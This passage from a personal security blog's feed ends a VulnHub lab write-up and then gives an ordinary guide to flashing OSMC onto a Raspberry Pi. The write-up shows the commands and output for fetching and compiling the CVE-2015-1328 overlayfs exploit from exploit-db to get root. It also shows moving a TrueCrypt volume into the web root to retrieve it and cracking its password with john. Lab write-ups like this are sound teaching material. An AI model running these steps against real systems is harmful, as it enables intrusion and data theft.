&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="privilege-escalation"&gt;Privilege escalation&lt;/h2&gt;
&lt;p&gt;We need a privilege escalation. Like for
&lt;a href="https://maggick.fr/2015/06/vulnhub-fart-knocker.html#CVE-2015-1328"&gt;Fart-knocker&lt;/a&gt;
We can use the CVE-2015-1328 exploiting overlayFS to get a root shell on the
machine.&lt;/p&gt;
&lt;p&gt;We spawn a shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; shell&lt;/span&gt;
&lt;span class="code-line"&gt;Process 1233 created.&lt;/span&gt;
&lt;span class="code-line"&gt;Channel 1 created.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We still have the permissions of &lt;code&gt;www-data&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We download the exploit &lt;code&gt;ofs.c&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;wget&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;download&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;37292&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="mi"&gt;2016&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;05&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;58&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;download&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;37292&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Resolving&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.124&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;249.8&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Connecting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mf"&gt;192.124&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;249.8&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;443.&lt;/span&gt;&lt;span class="o"&gt;..&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;connected&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;HTTP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sent&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;awaiting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;OK&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5123&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;5.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Saving&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;37292&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;.....&lt;/span&gt;&lt;span class="w"&gt;                                                 &lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;358&lt;/span&gt;&lt;span class="n"&gt;M&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;2016&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;05&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;58&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;358&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MB&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;37292&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;saved&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;5123&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;5123&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We rename the file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mv 37292 ofs.c&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We compile it and add execution permission:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gcc ofs.c -o ofs&lt;/span&gt;
&lt;span class="code-line"&gt;chmod +x ofs&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we just run it to gain root privileges on the box:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./ofs&lt;/span&gt;
&lt;span class="code-line"&gt;collect2: error: ld returned 1 exit status&lt;/span&gt;
&lt;span class="code-line"&gt;spawning threads&lt;/span&gt;
&lt;span class="code-line"&gt;mount #1&lt;/span&gt;
&lt;span class="code-line"&gt;mount #2&lt;/span&gt;
&lt;span class="code-line"&gt;child threads done&lt;/span&gt;
&lt;span class="code-line"&gt;/etc/ld.so.preload created&lt;/span&gt;
&lt;span class="code-line"&gt;creating shared library&lt;/span&gt;
&lt;span class="code-line"&gt;sh: 0: can&amp;#39;t access tty; job control turned off&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;# uid=0(root) gid=0(root) groups=0(root),33(www-data)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Okay let us search for the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls /root/&lt;/span&gt;
&lt;span class="code-line"&gt;# dave.tc&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="first-hint"&gt;First hint&lt;/h2&gt;
&lt;p&gt;It seems we have a truecrypt volume, let's download it on our machine for more
investigation:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;cp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dave&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we can download it directly from the server at &lt;code&gt;http://10.0.2.4/dave.tc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We need to extract the hashes from the file to pass them to john, hopefully a
tool exist just for that (we need to compile it):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;http://article.gmane.org/gmane.comp.security.openwall.john.user/5320&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As the mail mention the academy and the hint mention the rockyou password list,
let us just extract the academy related passwords from it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;grep academy /media/sf_password_lists/rockyou.txt &amp;gt; /tmp/test&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We launch john against the file with our partial rockyou list:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;john dave.tc.john -w=/tmp/test&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;tc_aes_xts&amp;quot;, but the string is also recognized as &amp;quot;tc_ripemd160&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--format=tc_ripemd160&amp;quot; option to force loading these as that type instead&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 6 password hashes with 6 different salts (tc_aes_xts, TrueCrypt AES256_XTS [SHA512 128/128 AVX 2x /RIPEMD160/WHIRLPOOL])&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded hashes with cost 1 (hash algorithm [1:SHA512 2:RIPEMD160 3:Whirlpool]) varying from 1 to 3&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;0g 0:00:00:01 54.22% (ETA: 17:16:27) 0g/s 59.89p/s 359.3c/s 359.3C/s fordacademy..ffmusicacademy&lt;/span&gt;
&lt;span class="code-line"&gt;etonacademy      (truecrypt_normal_volume)&lt;/span&gt;
&lt;span class="code-line"&gt;1g 0:00:00:03 DONE (2016-05-10 17:16) 0.2724g/s 59.94p/s 331.8c/s 331.8C/s 06academy..!academy&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We mount the container using veracrypt:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;veracrypt dave.tc -tc&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let us do a &lt;code&gt;tree -a&lt;/code&gt; to see what file we have in this container:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;.&lt;/span&gt;
&lt;span class="code-line"&gt;├── buller&lt;/span&gt;
&lt;span class="code-line"&gt;│   └── BullingdonCrest.jpg&lt;/span&gt;
&lt;span class="code-line"&gt;├── lost+found [error opening dir]&lt;/span&gt;
&lt;span class="code-line"&gt;├── panama&lt;/span&gt;
&lt;span class="code-line"&gt;│   └── shares.jpg&lt;/span&gt;
&lt;span class="code-line"&gt;└── .secret&lt;/span&gt;
&lt;span class="code-line"&gt;    ├── piers.png&lt;/span&gt;
&lt;span class="code-line"&gt;    └── .top&lt;/span&gt;
&lt;span class="code-line"&gt;        └── flag.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;5 directories, 4 files&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Content of ./secret/.top/flag.txt&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;################################################################################&lt;/span&gt;
&lt;span class="code-line"&gt;#   ___ ___  _  _  ___ ___    _ _____ _   _ _      _ _____ ___ ___  _  _  ___  #&lt;/span&gt;
&lt;span class="code-line"&gt;#  / __/ _ \| \| |/ __| _ \  /_\_   _| | | | |    /_\_   _|_ _/ _ \| \| |/ __| #&lt;/span&gt;
&lt;span class="code-line"&gt;# | (_| (_) | .` | (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .` |\__ \ #&lt;/span&gt;
&lt;span class="code-line"&gt;#  \___\___/|_|\_|\___|_|_\/_/ \_\_|  \___/|____/_/ \_\_| |___\___/|_|\_||___/ #&lt;/span&gt;
&lt;span class="code-line"&gt;#                                                                              #&lt;/span&gt;
&lt;span class="code-line"&gt;################################################################################&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Firstly, thanks for trying this VM. If you have rooted it, well done!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks&lt;/span&gt;
&lt;span class="code-line"&gt;goes to barrebas and junken for help in testing and final configuration.&lt;/span&gt;
&lt;span class="code-line"&gt;                                                                --knightmare&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It was a nice challenge, mainly for the beginner, probably a lack in the web
part (or the use of metapsloit, spoil myself of some fun exploiting the SQL
injection manually).&lt;/p&gt;
&lt;p&gt;Thanks to knightmare for the VM and as always thanks to vulnhub !&lt;/p&gt;</content><category term="security"></category><category term="drupal"></category><category term="security"></category><category term="vulnhub"></category><category term="boot2root"></category><category term="linux"></category></entry><entry><title>Installing OSMC without installer</title><link href="https://maggick.fr/2016/04/installing-osmc-without-installer.html" rel="alternate"></link><published>2016-04-14T23:49:00+02:00</published><updated>2016-04-14T23:49:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2016-04-14:/2016/04/installing-osmc-without-installer.html</id><summary type="html">&lt;p&gt;I bought the new raspberry pi 3 with integrated Wi-Fi. Currently I still have a
Ethernet cable running through my living room to my old raspberry pi 1.&lt;/p&gt;
&lt;p&gt;Just willing to download the last raspbmc version I figured that it was no more
raspbmc but osmc which is basically the same but with much marketing around it.
The most annoying one is that you need to install an install (such meta). I was
pretty much sure it was not really necessary and moreover there is no version of the
installer for Arch Linux.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;I bought the new raspberry pi 3 with integrated Wi-Fi. Currently I still have a
Ethernet cable running through my living room to my old raspberry pi 1.&lt;/p&gt;
&lt;p&gt;Just willing to download the last raspbmc version I figured that it was no more
raspbmc but osmc which is basically the same but with much marketing around it.
The most annoying one is that you need to install an install (such meta). I was
pretty much sure it was not really necessary and moreover there is no version of the
installer for Arch Linux.&lt;/p&gt;


&lt;p&gt;So instead using their installer you can download directly the image (you need to
click a button to display it) by selecting the right device and the last monthly
version.&lt;/p&gt;
&lt;p&gt;After the download just decompress the archive:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gunzip OSMC_TGT_rbp2_20160403.img.gz&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now you will need to know on which device is the sdcard. On Arch Linux with
system d, you may use &lt;code&gt;dmesg&lt;/code&gt; to have some info:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[  953.910932] mmc0: new high speed SDHC card at address e624&lt;/span&gt;
&lt;span class="code-line"&gt;[  953.973940] mmcblk0: mmc0:e624 SD04G 3.69 GiB&lt;/span&gt;
&lt;span class="code-line"&gt;[  953.982627]  mmcblk0: p1 p2&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;On my own computer the sdcard is named mmcblk0 and have two partition &lt;code&gt;p1&lt;/code&gt; and
&lt;code&gt;p2&lt;/code&gt;. From there you just need to copy the image to your sdcard (be sure to
remove the &lt;code&gt;p1&lt;/code&gt; or &lt;code&gt;p2&lt;/code&gt; if any, you need to write directly on the disk &lt;strong&gt;NOT&lt;/strong&gt;
on the partition):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;dd&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;OSMC_TGT_rbp2_20160403&lt;/span&gt;.&lt;span class="nv"&gt;img&lt;/span&gt; &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=/&lt;/span&gt;&lt;span class="nv"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;mmcblk0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then put the sdcard back on the raspberry pi and OSMC will install itself on the
device. Next it will prompt you with the home screen and guide you through the
first install settings. You will need to set language, location, wireless
password and so on.&lt;/p&gt;
&lt;p&gt;If you need to connect to osmc, default username and password are:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;osmc&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;osmc&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;If you need to add a SMB shared folder with authentication you will need to add
the share normally, get the error and then directly connect to the OSMC with
SSH and modify the XML file located at &lt;code&gt;home/osmc/.kodi/userdata/sources.xml&lt;/code&gt; by
adding the user and password as in the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;sources&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;video&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;pathversion&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;source&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Prime&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;pathversion&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;smb&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//user:password@10.0.0.111/video/&amp;lt;/path&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;source&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;video&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
